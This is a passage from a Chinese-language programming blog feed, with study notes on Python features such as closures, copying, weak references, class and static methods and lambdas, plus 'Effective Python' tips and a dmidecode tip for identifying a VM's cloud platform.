<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_aver</span>():</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">aver</span>(<span class="params">val</span>):</span><br><span class="line">        <span class="keyword">nonlocal</span> count</span><br><span class="line">        <span class="keyword">nonlocal</span> total</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        total += val</span><br><span class="line">        <span class="keyword">return</span> total / count</span><br><span class="line">    <span class="keyword">return</span> aver</span><br><span class="line"></span><br><span class="line">avg = make_aver()</span><br><span class="line"><span class="built_in">print</span>(avg(<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(avg(<span class="number">11</span>))</span><br></pre></td></tr></table></figure>

<h3><span id="闭包和匿名函数区别">闭包和匿名函数区别</span></h3><h2><span id="第8章-对象引用-可变性和垃圾回收">第8章 对象引用、可变性和垃圾回收</span></h2><h3><span id="x20默认做浅复制">&#x20;默认做浅复制</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l1 = [<span class="number">3</span>, [<span class="number">66</span>,<span class="number">55</span>,<span class="number">44</span>], (<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>)]</span><br><span class="line">l2 = <span class="built_in">list</span>(l1)</span><br><span class="line">l1.append(<span class="number">100</span>)</span><br><span class="line">l1[<span class="number">1</span>].remove(<span class="number">55</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l1 = [<span class="number">3</span>, [<span class="number">66</span>,<span class="number">44</span>], (<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>), <span class="number">100</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l2 = [<span class="number">3</span>, [<span class="number">66</span>,<span class="number">44</span>], (<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>)]</span><br><span class="line">l2[<span class="number">1</span>] += [<span class="number">33</span>,<span class="number">22</span>]</span><br><span class="line">l2[<span class="number">2</span>] += (<span class="number">10</span>,<span class="number">11</span>)</span><br><span class="line">[<span class="number">3</span>, [<span class="number">66</span>,<span class="number">44</span>,<span class="number">33</span>,<span class="number">22</span>], (<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>), <span class="number">100</span>]</span><br><span class="line">[<span class="number">3</span>, [<span class="number">66</span>,<span class="number">44</span>,<span class="number">33</span>,<span class="number">22</span>], (<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>), <span class="number">100</span>]</span><br></pre></td></tr></table></figure>

<ul>
<li>对可变对象来说，l2[1]引用的列表， +&#x3D;运算符就地修改列表，修改在l1[1]中也有体现</li>
<li>对元组来说，+&#x3D;创建一个新元组，然后重新绑定给变量l2[2]</li>
</ul>
<h3><span id="不要使用可变类型作为参数默认值">不要使用可变类型作为参数默认值</span></h3><h3><span id="防御可变参数">防御可变参数</span></h3><p>如果定义函数接收可变参数，应该谨慎考虑调用方是否期望修改传入参数</p>
<p>例：从TwilightBus下车后，乘客消失了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Bus</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, passengers=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">if</span> passengers <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="variable language_">self</span>.passengers = []</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="variable language_">self</span>.passengers = passengers</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">drop</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="variable language_">self</span>.passengers.remove(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">basketball_team = [<span class="string">&#x27;Sue&#x27;</span>, <span class="string">&#x27;Tina&#x27;</span>, <span class="string">&#x27;Maya&#x27;</span>]</span><br><span class="line">bus = Bus(basketball_team)</span><br><span class="line">bus.drop(<span class="string">&#x27;Tina&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(basketball_team)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&#x27;Sue&#x27;</span>, <span class="string">&#x27;Maya&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h3><span id="del和垃圾回收">del和垃圾回收</span></h3><p>对象不会自行销毁，然而无法得到对象时，可能被当做垃圾回收</p>
<p>del语句删除名称，而不是对象，举例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> weakref</span><br><span class="line">s1 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">s2 = s1</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bye</span>():</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;Gone with the wind...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ender = weakref.finalize(s1, bye)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ender.alive</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> s1</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ender.alive</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s2 = <span class="string">&#x27;spam&#x27;</span></span><br><span class="line">Gone <span class="keyword">with</span> the wind...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ender.alive</span><br><span class="line"><span class="literal">False</span></span><br></pre></td></tr></table></figure>

<h3><span id="x20弱引用">&#x20;弱引用</span></h3><p>当对象的饮用数量归零后，垃圾回收程序会把对象销毁，但是，有时需要引用对象，而不让对象存在时间超过所需时间，这经常用在缓存中</p>
<p>弱引用不会增加对象引用数量，引用的目标对象称为所指对象，因此我们说，弱引用不会妨碍所指对象被当做垃圾回收</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> weakref</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a_set = &#123;<span class="number">0</span>, <span class="number">1</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>wref = weakref.ref(a_set)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>wref</span><br><span class="line">&lt;weakref at <span class="number">0x100637598</span>; to <span class="string">&#x27;set&#x27;</span> at <span class="number">0x100636748</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>wref()</span><br><span class="line">&#123;<span class="number">0</span>, <span class="number">1</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a_set = &#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>wref()</span><br><span class="line">&#123;<span class="number">0</span>, <span class="number">1</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>wref() <span class="keyword">is</span> <span class="literal">None</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>wref() <span class="keyword">is</span> <span class="literal">None</span></span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h3><span id="x20python对不可变类型施加的把戏">&#x20;Python对不可变类型施加的把戏</span></h3><p>例：使用另一个元组构建元组，得到的是同一个元组</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>t1 = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t2 = <span class="built_in">tuple</span>(t1)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t2 <span class="keyword">is</span> t1</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t3 = t1[:]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t3 <span class="keyword">is</span> t1</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>例：字符串字面量可能会创建共享的对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>t1 = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t3 = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t3 <span class="keyword">is</span> t1</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1 = <span class="string">&#x27;ABC&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s2 = <span class="string">&#x27;ABC&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s2 <span class="keyword">is</span> s1</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h2><span id="第9章-符合python风格的对象">第9章 符合Python风格的对象</span></h2><p>讨论两个概念：</p>
<ul>
<li>如何以及何时使用@classmethod和@staticmethod装饰器</li>
<li>Python的私有属性和受保护属性的用法，约定和局限</li>
</ul>
<h3><span id="classmethod和staticmethod">classmethod和staticmethod</span></h3><ul>
<li>classmethod定义了操作类，而不是操作实例的方法, (参数没有this)</li>
<li>staticmethod就是普通函数，不过它碰巧在类的定义中体现 (不太有用）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>:</span><br><span class="line"><span class="meta">	@classmethod</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">klassmeth</span>(<span class="params">*args</span>):</span><br><span class="line">		<span class="keyword">return</span> args</span><br><span class="line"><span class="meta">	@staticmethod(<span class="params">*args</span>):</span></span><br><span class="line">		<span class="keyword">return</span> args</span><br></pre></td></tr></table></figure>

<p><a href="https://julien.danjou.info/blog/2013/guide-python-static-class-abstract-methods">https://julien.danjou.info/blog/2013/guide-python-static-class-abstract-methods</a></p>
<h3><span id="python的私有属性和受保护的属性">Python的私有属性和受保护的属性</span></h3><ul>
<li>_private_attrs：两个下划线开头，声明该属性为私有，不能在类地外部被使用或直接访问。 在类内部的方法中使用时 self.__private_attrs</li>
<li>__private_method：两个下划线开头，声明该方法为私有方法，不能在类地外部调用</li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python的Lamdba函数是什么，应用场景是什么?</title>
    <url>/2023/0815215310.html</url>
    <content><![CDATA[<p><strong>定义：</strong> Lambda函数也叫匿名函数，它是功能简单，只用一行代码就能实现的小型函数。<br><strong>使用场景：</strong> Lambda函数没有名字，不用考虑函数名冲突问题；减少了代码行数，方便又简洁。<br><strong>格式：</strong> lambda 参数[,参数] : 表达式 （例： <code>lambda x,y : x + y</code>）<br><strong>举例：</strong> 用lambda函数求出1到20中所有的奇数并组成一个list：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">L = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x % <span class="number">2</span> == <span class="number">1</span>, <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>)))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(L)</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">19</span>]</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<p>另外，匿名函数也可以赋值给变量，可以通过该变量调用这个匿名函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="keyword">lambda</span> x: x * x</span><br><span class="line"><span class="built_in">print</span>(f(<span class="number">5</span>))</span><br><span class="line"><span class="number">25</span></span><br></pre></td></tr></table></figure>

<h2><span id="参考资料">参考资料</span></h2><p>【1】<a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017451447842528">https://www.liaoxuefeng.com/wiki/1016959663602400/1017451447842528</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>判断虚拟机类型是VMware,AWS,Azure的方法</title>
    <url>/2023/1123193523.html</url>
    <content><![CDATA[<p>使用<code>dmidecode</code>，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># AWS：</span></span><br><span class="line">dmidecode -t system | grep Manufacturer</span><br><span class="line">        Manufacturer: Amazon EC2</span><br><span class="line"><span class="comment"># VMware：</span></span><br><span class="line">dmidecode -t system | grep Manufacturer</span><br><span class="line">        Manufacturer: VMware, Inc</span><br><span class="line"><span class="comment"># Azure:</span></span><br><span class="line">dmidecode -t system | grep Manufacturer</span><br><span class="line">        Manufacturer: Microsoft Corporation</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>VMware</category>
      </categories>
      <tags>
        <tag>VMware</tag>
      </tags>
  </entry>
  <entry>
    <title>Effective Python 笔记</title>
    <url>/2023/0812215151.html</url>
    <content><![CDATA[<h1><span id="前言">前言</span></h1><p>不错的Python进阶书。写这个笔记的目的是，把书中提到的编写高质量Python的59个方法的要点记录下来，便于今后的工作中查阅</p>
<h1><span id="第1章用pythonic方式来思考">第1章：用Pythonic方式来思考</span></h1><span id="more"></span>

<h2><span id="x201-用pythonic方式来思考">&#x20;1. 用Pythonic方式来思考</span></h2><p>python之禅 —— <code>import this</code></p>
<h2><span id="x202-遵循pep8风格">&#x20;2. 遵循PEP8风格</span></h2><p>PEP8 —— Python Enhancement Proposal #8</p>
<p>空白：</p>
<ul>
<li>使用空格而不是tab表示缩进</li>
<li>和语法相关每一层缩进用4个空格</li>
<li>每行字符数不超过79</li>
<li>占据多行表达式，除首行外其余各行应在通常缩进级别上加4空格</li>
<li>函数与类之间两个空行隔开</li>
<li>同一个类中，各方法一个空行隔开</li>
<li>使用下标获取元素，不要在两旁加空格</li>
<li>为变量赋值，赋值符号左侧和右侧各自写一个空格，不要在两旁添加空格</li>
</ul>
<p>命名：</p>
<ul>
<li>函数、变量、属性用小写，各单词以下划线连接</li>
<li>受保护实例属性，以单下划线开头</li>
<li>私有实例属性：以两个下划线开头</li>
<li>类以异常，应每个单词以大写形式命名，如CapitalizedWord</li>
<li>模块级别常量，应全部采用大写，各单词以下划线相连，如ALL_CAPS</li>
<li>类中实例方法，应该把首个参数命名为self，以表示对象自身</li>
<li>类方法首个参数，应该命名为cls，以表示类自身</li>
</ul>
<p>表达式和语句：</p>
<ul>
<li>采用内联形式否定词，而不是把否定词放在整个表达式前面，例如写if a is not b 而不是 if not a is b</li>
<li>不要通过测长度方法判断list是否为空，应采用if not list，空值会自动评估为False</li>
<li>import语句总应放在文件开头</li>
<li>引入模块时总应使用绝对名称，不应根据当前模块路径使用相对名称，例如引入bar包中的foo模块，应完整写出from bar import foo，不应该简写import foo</li>
<li>文件中import语句应按顺序划三部分，分别表示标准库模块，第三方模块，自用模块，各部分中的import语句应按模块的字母顺序排列</li>
</ul>
<h2><span id="3-了解bytes-str-unicode区别">3. 了解bytes, str, unicode区别</span></h2><ul>
<li>Python3中，bytes是一个包含8位置的序列，str是一种包含unicode字符序列</li>
</ul>
<h2><span id="4-用辅助函数取代复杂表达式">4. 用辅助函数取代复杂表达式</span></h2><p>开发者容易过度运用Python语法特性，写出特别复杂难以理解的单行表达式。<strong>这种情况需要把复杂表达式移到辅助函数</strong></p>
<h2><span id="5-了解切割序列的方法">5. 了解切割序列的方法</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[:<span class="number">4</span>]</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">5</span>:]</span><br><span class="line">[<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[-<span class="number">2</span>:]</span><br><span class="line">[<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">2</span>:-<span class="number">3</span>]</span><br><span class="line">[<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[:]</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>]</span><br><span class="line">a[<span class="number">2</span>:<span class="number">6</span>] = [<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;o&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h2><span id="6-单次切片操作内不要同时指定start-end-stride">6. 单次切片操作内，不要同时指定start, end, stride</span></h2><p>除了基本切片操作，Python还提供了somelist[start:end:stride]形式写法，以实现步进式切割，就是从每n个元素里取1个出来</p>
<p>既有start, end，又有stride的切割操作，可能令人费解，考虑拆解两条语句，其中一条做范围切割，另一条做步进切割，如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b = a[::<span class="number">2</span>]    <span class="comment"># [&#x27;a&#x27;, &#x27;c&#x27;, &#x27;e&#x27;, &#x27;g&#x27;]</span></span><br><span class="line">c = b[<span class="number">1</span>:-<span class="number">1</span>]   <span class="comment"># [&#x27;c&#x27;, &#x27;e&#x27;]</span></span><br></pre></td></tr></table></figure>

<h2><span id="x207-用列表推导取代map-filter">&#x20;7. 用列表推导取代map, filter</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">squares = [ x**<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> a ]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(squares)</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>]</span><br><span class="line">或者<span class="built_in">map</span>, <span class="built_in">filter</span></span><br><span class="line">squares = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: x ** <span class="number">2</span>, a)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">list</span>(squares)</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>]</span><br></pre></td></tr></table></figure>

<h2><span id="8-不要使用含有两个以上表达式的列表推导">8. 不要使用含有两个以上表达式的列表推导</span></h2><p>例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_lists = [</span><br><span class="line">    [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]],</span><br><span class="line">]</span><br><span class="line">flat = [x <span class="keyword">for</span> sublist1 <span class="keyword">in</span> my_lists</span><br><span class="line">		  <span class="keyword">for</span> sublist2 <span class="keyword">in</span> sublist1</span><br><span class="line">		  <span class="keyword">for</span> x <span class="keyword">in</span> sublist2]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以看出，列表推导写法不够简洁，改用普通循环语句实现相同效果</span></span><br><span class="line">flat = []</span><br><span class="line"><span class="keyword">for</span> sublist1 <span class="keyword">in</span> my_lists:</span><br><span class="line">	<span class="keyword">for</span> sublist2 <span class="keyword">in</span> sublist1:</span><br><span class="line">		flat.extend(sublist2)</span><br></pre></td></tr></table></figure>

<h2><span id="9-用生成器表达式改写数据量较大的列表推导">9. 用生成器表达式改写数据量较大的列表推导</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">it = (<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;file.txt&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(it)</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">generator obj at XXX</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(it))</span><br></pre></td></tr></table></figure>

<h2><span id="10-尽量用enumerate取代range">10. 尽量用enumerate取代range</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flavor_list = [<span class="string">&#x27;vanilla&#x27;</span>, <span class="string">&#x27;chocolate&#x27;</span>, <span class="string">&#x27;pecan&#x27;</span>, <span class="string">&#x27;strawberry&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i, flavor <span class="keyword">in</span> <span class="built_in">enumerate</span>(flavor_list):</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;%d: %s&#x27;</span> % (i + <span class="number">1</span>, flavor))</span><br></pre></td></tr></table></figure>

<p>还可以直接指定enumerate函数开始计数时所用值，这样能把代码写的更短</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i, flavor <span class="keyword">in</span> <span class="built_in">enumerate</span>(flavor_list, <span class="number">1</span>):</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;%d: %s&#x27;</span> % (i, flavor))</span><br></pre></td></tr></table></figure>

<h2><span id="11-用zip函数同时遍历两个迭代器">11. 用zip函数同时遍历两个迭代器</span></h2><p>使用range或enumerate方法的代码不够简洁</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">names = [<span class="string">&#x27;Cecilia&#x27;</span>, <span class="string">&#x27;Lise&#x27;</span>, <span class="string">&#x27;Marie&#x27;</span>]</span><br><span class="line">letters = [ <span class="built_in">len</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> names]</span><br><span class="line"></span><br><span class="line">longest_name = <span class="literal">None</span></span><br><span class="line">max_letters = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i, name <span class="keyword">in</span> <span class="built_in">enumerate</span>(names):</span><br><span class="line">    <span class="keyword">if</span> letters[i] &gt; max_letters:</span><br><span class="line">        max_letters = letters[i]</span><br><span class="line">        longest_name = name</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;longest_name: &#x27;</span>, longest_name)</span><br></pre></td></tr></table></figure>

<p>改用内置zip方法，使代码更清晰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">names = [<span class="string">&#x27;Cecilia&#x27;</span>, <span class="string">&#x27;Lise&#x27;</span>, <span class="string">&#x27;Marie&#x27;</span>]</span><br><span class="line">letters = [ <span class="built_in">len</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> names]</span><br><span class="line"></span><br><span class="line">longest_name = <span class="literal">None</span></span><br><span class="line">max_letters = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> name, count <span class="keyword">in</span> <span class="built_in">zip</span>(names, letters):</span><br><span class="line">    <span class="keyword">if</span> count &gt; max_letters:</span><br><span class="line">        longest_name = name</span><br><span class="line">        max_letters = count</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;longest_name: &#x27;</span>, longest_name)</span><br></pre></td></tr></table></figure>

<p>注意点：</p>
<ul>
<li>Python2中zip不是生成器，而是会把开发者提供那些迭代器都平行遍历一次，可能占用大量内存导致程序崩溃</li>
<li>如果输入迭代器长度不同，zip会提前终止，将导致意外结果</li>
</ul>
<h2><span id="12-不要在for和while循环后写else块">12. 不要在for和while循环后写else块</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;Loop %d&#x27;</span> % i)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;Else block!&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>else块会在整个循环执行完之后立刻运行</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Loop %d&#x27;</span> % i)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Else block!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">$ python test.py</span><br><span class="line">Loop <span class="number">0</span></span><br><span class="line">Loop <span class="number">1</span></span><br><span class="line">Loop <span class="number">2</span></span><br><span class="line">Else block!</span><br></pre></td></tr></table></figure>

<ul>
<li>循环里用break提前跳出，会导致else块不执行</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;Loop %d&#x27;</span> % i)</span><br><span class="line">	<span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;Else block!&#x27;</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">Loop <span class="number">0</span></span><br><span class="line">Loop <span class="number">1</span></span><br></pre></td></tr></table></figure>

<ul>
<li>如果for循环遍历序列是空的，就会立刻执行else块</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> []:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;Never runs&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;For Else block!&#x27;</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">For Else block!</span><br></pre></td></tr></table></figure>

<p>要点：不要在循环后使用else块，这种写法即不直观，又容易让人误解</p>
<h2><span id="13-合理利用tryx2fexceptx2felsex2ffinally结构中每个代码块">13. 合理利用try&#x2F;except&#x2F;else&#x2F;finally结构中每个代码块</span></h2><ul>
<li>无论try是否异常，都可利用try&#x2F;finally复合语句中finally块执行清理工作</li>
<li>else块可用来缩减try代码量，并把没有发生异常所要执行的语句与try&#x2F;except分开</li>
<li>顺利运行try块后，若想使某些操作能在finaly块的清理代码前执行，可将这些操作写到else</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">UNDEFINED = <span class="built_in">object</span>()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">divide_json</span>(<span class="params">path</span>):</span><br><span class="line">	handle = <span class="built_in">open</span>(path, <span class="string">&#x27;r+&#x27;</span>)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		data = handle.read()</span><br><span class="line">		op = json.loads(data)</span><br><span class="line">		value = (op[<span class="string">&#x27;numerator&#x27;</span>]/op[<span class="string">&#x27;denominator&#x27;</span>])</span><br><span class="line">	<span class="keyword">except</span> ZeroDivisionError es e:</span><br><span class="line">		<span class="keyword">return</span> UNDEFINED</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">	    op[<span class="string">&#x27;result&#x27;</span>] = value</span><br><span class="line">	    result = json.dumps(op)</span><br><span class="line">	    handle.seek(<span class="number">0</span>)</span><br><span class="line">	    handle.write(result)</span><br><span class="line">	    <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">	    handle.close()</span><br></pre></td></tr></table></figure>

<h1><span id="第2章-函数">第2章 函数</span></h1><h2><span id="14-尽量用异常来表示特殊情况而不返回nones">14. 尽量用异常来表示特殊情况，而不返回Nones</span></h2><p>例：令函数返回None，可能会使调用该函数人犯错</p>
